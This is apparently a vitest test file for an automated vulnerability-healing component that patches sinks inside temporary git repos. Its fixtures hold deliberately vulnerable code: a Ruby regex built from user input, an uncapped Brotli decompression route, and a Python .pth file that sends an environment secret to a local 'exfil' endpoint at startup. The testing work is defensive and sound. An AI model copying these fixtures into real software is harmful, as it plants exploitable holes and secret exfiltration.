/**
 * CanaryHealer tests — deterministic candidate generators (pure) + the full
 * onViolation heal loop against TEMP git repos (mkdtemp; the real repo and
 * user profile are never touched — AGENTS.md rule 5). Helper style mirrors
 * packages/cordis-sandbox/src/fiber.test.ts.
 */
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { listActiveFibers } from '@astram/cordis-sandbox';
import { LedgerDb, MultiverseDag } from '@astram/db';
import type { JevDecisionClient } from '@astram/gatekeeper';
import { newTxId, RiskLevel, type AstCapabilityFact, type AtomicAuditTx, type PolicyVerdict } from '@astram/types';
import { generateDeterministicCandidates } from './candidates.js';
import { CanaryHealer } from './healer.js';
import type { HealCandidate } from './types.js';

let tmpRoot = '';

function git(repo: string, args: string[]): ReturnType<typeof spawnSync> {
  return spawnSync('git', args, { cwd: repo, shell: false, windowsHide: true, timeout: 30_000 });
}

/** Fresh tmp git repo with the given committed files (+ node_modules/ ignored). */
function initGitRepo(name: string, files: Record<string, string>): string {
  const repo = path.join(tmpRoot, name);
  fs.mkdirSync(repo, { recursive: true });
  for (const [rel, content] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(repo, rel)), { recursive: true });
    fs.writeFileSync(path.join(repo, rel), content, 'utf8');
  }
  fs.writeFileSync(path.join(repo, '.gitignore'), 'node_modules/\n');
  const steps: string[][] = [
    ['init', '-q'],
    ['config', 'user.email', 'agent-h@astram.local'],
    ['config', 'user.name', 'Agent H'],
    ['config', 'core.autocrlf', 'false'],
    ['add', '-A'],
    ['commit', '-qm', 'init'],
  ];
  for (const args of steps) {
    const r = git(repo, args);
    if (r.status !== 0) throw new Error(`initGitRepo: git ${args[0]} failed: ${r.stderr.toString()}`);
  }
  return repo;
}

const LEAK_RB = `# Sinatra-style search route (CVE-2026-110264 shape)
def search
  pattern = Regexp.compile(params[:q])
  File.readlines('data/log.txt').grep(pattern)
end
`;

const APP_JS = `const express = require('express');
const zlib = require('zlib');
app.post('/upload', (req, res) => { const d = zlib.createBrotliDecompress(); req.pipe(d).pipe(res); });
`;

const EVIL_PTH = `import os, urllib.request
urllib.request.urlopen("http://127.0.0.1:19999/exfil?s=" + os.environ.get("AEGIS_CANARY_SECRET_999", ""))
`;

function makeVerdict(target: string, facts: AstCapabilityFact[] = []): PolicyVerdict {
  return {
    target,
    category: 'BYTEPATH_SINK',
    deterministicRisk: RiskLevel.HOLD,
    apiDelta: 0,
    finalRisk: RiskLevel.HOLD,
    reasoning: 'bytepath taint: untrusted input reaches an exploitable sink',
    evidenceSummary: 'RUBY_REGEXP sink at leak.rb',
    facts,
    disposition: 'BLOCKED_PRE_EXEC',
  };
}

function makeTx(txId: string, disposition: AtomicAuditTx['disposition']): AtomicAuditTx {
  return {
    txId,
    sessionId: 'canary-test',
    fiberId: 'fiber-canary-test',
    parentTxId: null,
    agentHost: 'claude-code',
    timestampMs: 1_700_000_000_000,
    policyCharterId: 'astram-policy-charter-v1',
    statedExplanation: 'violating tool call',
    mcpServerId: 'mcp-fs',
    toolName: 'fs.write',
    redactedArgumentsJson: '{}',
    deterministicRisk: RiskLevel.HOLD,
    decisionApiDelta: 0,
    finalMonotonicRisk: RiskLevel.HOLD,
    fsModifiedFilesJson: '[]',
    turboquantSlabIndex: null,
    anomalyScore: 0.9,
    violationDetected: 1,
    disposition,
  };
}

beforeAll(() => {
  tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'canary-healer-'));
});

afterAll(() => {
  if (tmpRoot !== '') fs.rmSync(tmpRoot, { recursive: true, force: true });
});

describe('generateDeterministicCandidates (pure)', () => {
  it('ruby leak.rb -> Regexp.escape wraps the non-literal first argument', () => {
    const cands = generateDeterministicCandidates([{ path: 'leak.rb', content: LEAK_RB }]);
    expect(cands).toHaveLength(1);
    expect(cands[0].source).toBe('deterministic');
    const op = cands[0].patch[0];
    expect(op.file).toBe('leak.rb');
    expect(op.find).toBe('Regexp.compile(params[:q])');
    expect(op.replace).toBe('Regexp.compile(Regexp.escape(params[:q]))');
  });

  it('literal / already-escaped ruby args are skipped', () => {
    const cands = generateDeterministicCandidates([
      { path: 'ok.rb', content: "Regexp.new('^literal$')\nRegexp.compile(Regexp.escape(x))\n" },
    ]);
    expect(cands).toEqual([]);
  });

  it('app.js brotli -> size-capped call + isSafePayload guard candidate', () => {
    const cands = generateDeterministicCandidates([{ path: 'app.js', content: APP_JS }]);
    expect(cands).toHaveLength(1);
    const finds = cands[0].patch.map((p) => p.find);
    expect(finds).toContain('createBrotliDecompress()');
    const callOp = cands[0].patch.find((p) => p.find === 'createBrotliDecompress()')!;
    expect(callOp.replace).toContain('maxOutputLength');
    const guardOp = cands[0].patch.find((p) => p.find.includes("require('zlib')"));
    expect(guardOp).toBeDefined();
    expect(guardOp!.replace).toContain('function isSafePayload(chunk)');
  });

  it('.pth -> every executable line is commented out (imports included)', () => {
    const cands = generateDeterministicCandidates([{ path: 'evil_init.pth', content: EVIL_PTH }]);
    expect(cands).toHaveLength(1);
    const op = cands[0].patch[0];
    const replaced = EVIL_PTH.replace(op.find, () => op.replace);
    for (const line of replaced.split(/\r?\n/)) {
      const t = line.trim();
      expect(t === '' || t.startsWith('#')).toBe(true);
    }
    expect(replaced).toContain('#import os, urllib.request');
  });

  it('benign files produce no candidates', () => {
    expect(generateDeterministicCandidates([{ path: 'README.md', content: '# hello\n' }])).toEqual([]);
  });
});

describe('CanaryHealer.onViolation — full loop (temp git repo)', () => {
  it('heals: patches the main repo, marks the DAG fork + ledger tx CANARY_HEALED (< 30 s)', async () => {
    const repo = initGitRepo('repo-heal', { 'leak.rb': LEAK_RB });
    const worktrees = path.join(tmpRoot, 'worktrees-heal');
    const verdict = makeVerdict('leak.rb', [
      {
        ruleId: 'BYTEPATH_RUBY_REGEXP',
        category: 'BYTEPATH_SINK',
        file: 'leak.rb',
        line: 3,
        snippet: 'Regexp.compile(params[:q])',
        deterministicRisk: RiskLevel.HOLD,
      },
    ]);
    const txId = newTxId(verdict);

    const ledger = new LedgerDb(path.join(tmpRoot, 'heal', 'aegis_ledger.db'));
    ledger.insertAtomicTx(makeTx(txId, 'BLOCKED_PRE_EXEC'));
    const dag = MultiverseDag.fromTxs(ledger.listTxs());

    const healer = new CanaryHealer({ ledger, dag, jev: null, repoRoot: repo, worktreesRoot: worktrees });
    const t0 = Date.now();
    const report = await healer.onViolation(verdict, [{ path: 'leak.rb', content: LEAK_RB }], async () => ({
      blockedExploit: true,
      unitTestsPassed: true,
    }));
    const elapsed = Date.now() - t0;

    expect(report.healed).toBe(true);
    expect(report.attempted).toBe(true);
    expect(report.winningCandidateId).toBe('det-1');
    expect(report.violationTxId).toBe(txId);
    expect(report.forkedFiberId).not.toBe('');
    expect(report.candidates[0]).toEqual({ id: 'det-1', blockedExploit: true, unitTestsPassed: true, promoted: true });
    expect(elapsed).toBeLessThan(30_000);

    // main repo file actually patched
    const patched = fs.readFileSync(path.join(repo, 'leak.rb'), 'utf8');
    expect(patched).toContain('Regexp.escape(params[:q])');

    // DAG: fork node marked CANARY_HEALED
    const forkNode = dag.toJSON().nodes.find((n) => n.canaryFork);
    expect(forkNode).toBeDefined();
    expect(forkNode?.parentTxId).toBe(txId);
    expect(forkNode?.label).toBe('canary-1');
    expect(forkNode?.disposition).toBe('CANARY_HEALED');

    // ledger tx updated
    expect(ledger.getTx(txId)?.disposition).toBe('CANARY_HEALED');

    // fibers cleaned up after the commit path
    expect(listActiveFibers(worktrees).map((f) => f.fiberId)).toEqual([]);
    expect(fs.existsSync(path.join(worktrees, report.forkedFiberId))).toBe(false);
    console.log(`[canary.test] onViolation full heal: elapsedMs=${report.elapsedMs}`);
    ledger.close();
  });

  it('no candidate verifies: repo untouched, all fibers disposed ROLLED_BACK', async () => {
    const repo = initGitRepo('repo-fail', { 'leak.rb': LEAK_RB });
    const worktrees = path.join(tmpRoot, 'worktrees-fail');
    const verdict = makeVerdict('leak.rb');
    const txId = newTxId(verdict);

    const ledger = new LedgerDb(path.join(tmpRoot, 'fail', 'aegis_ledger.db'));
    ledger.insertAtomicTx(makeTx(txId, 'BLOCKED_PRE_EXEC'));
    const dag = MultiverseDag.fromTxs(ledger.listTxs());

    const healer = new CanaryHealer({ ledger, dag, jev: null, repoRoot: repo, worktreesRoot: worktrees });
    const report = await healer.onViolation(verdict, [{ path: 'leak.rb', content: LEAK_RB }], async () => ({
      blockedExploit: false,
      unitTestsPassed: true,
    }));

    expect(report.healed).toBe(false);
    expect(report.winningCandidateId).toBeUndefined();
    expect(report.attempted).toBe(true);
    expect(report.candidates.length).toBeGreaterThanOrEqual(1);
    for (const row of report.candidates) {
      expect(row.promoted).toBe(false);
      expect(row.blockedExploit).toBe(false);
    }

    // main repo untouched
    expect(fs.readFileSync(path.join(repo, 'leak.rb'), 'utf8')).toBe(LEAK_RB);

    // fibers cleaned up: registry empty and no worktree dirs remain
    expect(listActiveFibers(worktrees)).toEqual([]);
    const leftovers = fs
      .readdirSync(worktrees)
      .filter((d) => d !== 'fibers.json');
    expect(leftovers).toEqual([]);

    // DAG fork exists but is NOT marked CANARY_HEALED
    const forkNode = dag.toJSON().nodes.find((n) => n.canaryFork);
    expect(forkNode?.disposition).toBe('BLOCKED_PRE_EXEC'); // inherited from the parent
    expect(ledger.getTx(txId)?.disposition).toBe('BLOCKED_PRE_EXEC');
    ledger.close();
  });

  it('unit-test failure alone blocks promotion (blockedExploit true is not enough)', async () => {
    const repo = initGitRepo('repo-unittest-fail', { 'leak.rb': LEAK_RB });
    const worktrees = path.join(tmpRoot, 'worktrees-utf');
    const ledger = new LedgerDb(path.join(tmpRoot, 'utf', 'aegis_ledger.db'));
    const dag = MultiverseDag.fromTxs([]);
    const healer = new CanaryHealer({ ledger, dag, repoRoot: repo, worktreesRoot: worktrees });
    const report = await healer.onViolation(
      makeVerdict('leak.rb'),
      [{ path: 'leak.rb', content: LEAK_RB }],
      async () => ({ blockedExploit: true, unitTestsPassed: false })
    );
    expect(report.healed).toBe(false);
    expect(fs.readFileSync(path.join(repo, 'leak.rb'), 'utf8')).toBe(LEAK_RB);
    ledger.close();
  });
});

describe('CanaryHealer — defensive paths', () => {
  it('jev: null (and a throwing jev client) never throw; deterministic candidate still heals', async () => {
    const ledger = new LedgerDb(path.join(tmpRoot, 'jevnull', 'aegis_ledger.db'));
    const dag = MultiverseDag.fromTxs([]); // tx NOT in the DAG -> synthetic node path

    const throwingJev = {
      evaluateAstFacts: async (): Promise<never> => {
        throw new Error('network down');
      },
    } as unknown as JevDecisionClient;

    // Fresh repo per run: after the first heal the repo file no longer matches
    // HEAD, so a second promotion of the same diff would legitimately conflict.
    for (const [i, jev] of [null, throwingJev].entries()) {
      const repo = initGitRepo(`repo-jevnull-${i}`, { 'leak.rb': LEAK_RB });
      const worktrees = path.join(tmpRoot, `worktrees-jevnull-${i}`);
      const healer = new CanaryHealer({ ledger, dag, jev, repoRoot: repo, worktreesRoot: worktrees });
      const report = await healer.onViolation(
        makeVerdict('leak.rb'),
        [{ path: 'leak.rb', content: LEAK_RB }],
        async () => ({ blockedExploit: true, unitTestsPassed: true })
      );
      expect(report.healed).toBe(true);
      expect(fs.readFileSync(path.join(repo, 'leak.rb'), 'utf8')).toContain('Regexp.escape(params[:q])');
      // ledger tx was absent -> synthesized then marked CANARY_HEALED
      expect(ledger.getTx(report.violationTxId)?.disposition).toBe('CANARY_HEALED');
    }
    // synthetic parent node + two forks (one per onViolation call) exist
    const nodes = dag.toJSON().nodes;
    expect(nodes.filter((n) => n.canaryFork).length).toBe(2);
    ledger.close();
  });

  it('a Jev suggestedPatchSnippet becomes a "jev" source candidate anchored on a file line', async () => {
    const repo = initGitRepo('repo-jevsnippet', { 'leak.rb': LEAK_RB });
    const worktrees = path.join(tmpRoot, 'worktrees-jevs');
    const ledger = new LedgerDb(path.join(tmpRoot, 'jevs', 'aegis_ledger.db'));
    const dag = MultiverseDag.fromTxs([]);

    // The snippet QUOTES the vulnerable line (anchor) and appends a guard.
    const snippet = [
      'pattern = Regexp.compile(params[:q])',
      "# astram-jev: guard untrusted regex length before compiling",
      "raise ArgumentError, 'input too long' if params[:q].to_s.length > 256",
    ].join('\n');
    const jev = {
      evaluateAstFacts: async () => ({
        finalRisk: RiskLevel.HOLD,
        apiDelta: 0,
        reasoning: 'escape the pattern',
        suggestedPatchSnippet: snippet,
      }),
    } as unknown as JevDecisionClient;

    const healer = new CanaryHealer({ ledger, dag, jev, repoRoot: repo, worktreesRoot: worktrees });
    const seen: HealCandidate[] = [];
    const report = await healer.onViolation(
      makeVerdict('leak.rb'),
      [{ path: 'leak.rb', content: LEAK_RB }],
      async (candidate) => {
        seen.push(candidate);
        // Only the Jev patch verifies — proves the jev candidate can win the
        // tournament (deterministic first, Jev competes, loser is rolled back).
        return { blockedExploit: candidate.source === 'jev', unitTestsPassed: true };
      }
    );

    expect(report.healed).toBe(true);
    expect(report.winningCandidateId).toBe('jev-1');
    expect(report.forkedFiberId).not.toBe('');
    const sources = seen.map((c) => c.source);
    expect(sources).toContain('deterministic');
    expect(sources).toContain('jev');
    const jevCand = seen.find((c) => c.source === 'jev')!;
    expect(jevCand.patch[0].find).toBe('  pattern = Regexp.compile(params[:q])');
    expect(jevCand.patch[0].replace).toBe(snippet);
    expect(fs.readFileSync(path.join(repo, 'leak.rb'), 'utf8')).toContain('# astram-jev');
    ledger.close();
  });

  it('unanchorable / empty candidates are recorded but never verified; no vulnerable files -> attempted false', async () => {
    const repo = initGitRepo('repo-empty', { 'leak.rb': LEAK_RB });
    const worktrees = path.join(tmpRoot, 'worktrees-empty');
    const ledger = new LedgerDb(path.join(tmpRoot, 'empty', 'aegis_ledger.db'));
    const dag = MultiverseDag.fromTxs([]);
    const healer = new CanaryHealer({ ledger, dag, jev: null, repoRoot: repo, worktreesRoot: worktrees });

    const report = await healer.onViolation(makeVerdict('leak.rb'), [], async () => ({
      blockedExploit: true,
      unitTestsPassed: true,
    }));
    expect(report.healed).toBe(false);
    expect(report.attempted).toBe(false);
    expect(report.candidates).toEqual([]);
    // the fork still happened (audit trail) even with nothing to try
    expect(dag.toJSON().nodes.some((n) => n.canaryFork)).toBe(true);
    ledger.close();
  });

  it('re-running onViolation for the same verdict forks canary-2 (no label collision)', async () => {
    const repo = initGitRepo('repo-twice', { 'leak.rb': LEAK_RB });
    const worktrees = path.join(tmpRoot, 'worktrees-twice');
    const ledger = new LedgerDb(path.join(tmpRoot, 'twice', 'aegis_ledger.db'));
    const dag = MultiverseDag.fromTxs([]);
    const healer = new CanaryHealer({ ledger, dag, jev: null, repoRoot: repo, worktreesRoot: worktrees });
    const verdict = makeVerdict('leak.rb');

    const r1 = await healer.onViolation(verdict, [{ path: 'leak.rb', content: LEAK_RB }], async () => ({
      blockedExploit: true,
      unitTestsPassed: true,
    }));
    expect(r1.healed).toBe(true);
    // Second run: the repo file is already healed, verify now fails -> no re-heal.
    const r2 = await healer.onViolation(verdict, [{ path: 'leak.rb', content: LEAK_RB }], async () => ({
      blockedExploit: false,
      unitTestsPassed: false,
    }));
    expect(r2.healed).toBe(false);
    const labels = dag
      .toJSON()
      .nodes.filter((n) => n.canaryFork)
      .map((n) => n.label)
      .sort();
    expect(labels).toEqual(['canary-1', 'canary-2']);
    ledger.close();
  });

  it('measures and logs the commitToMain hot-swap apply path', async () => {
    const repo = initGitRepo('repo-timing', { 'leak.rb': LEAK_RB });
    const worktrees = path.join(tmpRoot, 'worktrees-timing');
    const ledger = new LedgerDb(path.join(tmpRoot, 'timing', 'aegis_ledger.db'));
    const dag = MultiverseDag.fromTxs([]);
    const healer = new CanaryHealer({ ledger, dag, jev: null, repoRoot: repo, worktreesRoot: worktrees });

    const t0 = performance.now();
    const report = await healer.onViolation(
      makeVerdict('leak.rb'),
      [{ path: 'leak.rb', content: LEAK_RB }],
      async () => ({ blockedExploit: true, unitTestsPassed: true })
    );
    const wall = performance.now() - t0;
    // Fiber lifecycle dominates (git worktree add/remove); the whole loop stays
    // far below the 30 s budget. The commitToMain apply-path duration is inside
    // report.elapsedMs and printed by the healer's [canary] log line.
    expect(report.elapsedMs).toBeLessThan(30_000);
    expect(wall).toBeLessThan(30_000);
    expect(report.healed).toBe(true);
    ledger.close();
  });
});

describe('applyPatch (literal replacement semantics)', () => {
  it('is literal: $-sequences in the replacement are never interpreted', async () => {
    const { applyPatch } = await import('./candidates.js');
    const r = applyPatch('value = getUser($1)', [{ find: 'getUser($1)', replace: 'safe($& $2)' }]);
    expect(r.ok).toBe(true);
    expect(r.content).toBe('value = safe($& $2)');
  });

  it('missing anchor -> ok:false with content untouched', async () => {
    const { applyPatch } = await import('./candidates.js');
    const r = applyPatch('abc', [{ find: 'zzz', replace: 'y' }]);
    expect(r.ok).toBe(false);
    expect(r.content).toBe('abc');
  });
});

// (no placeholder footer — public API exercised through the healer)
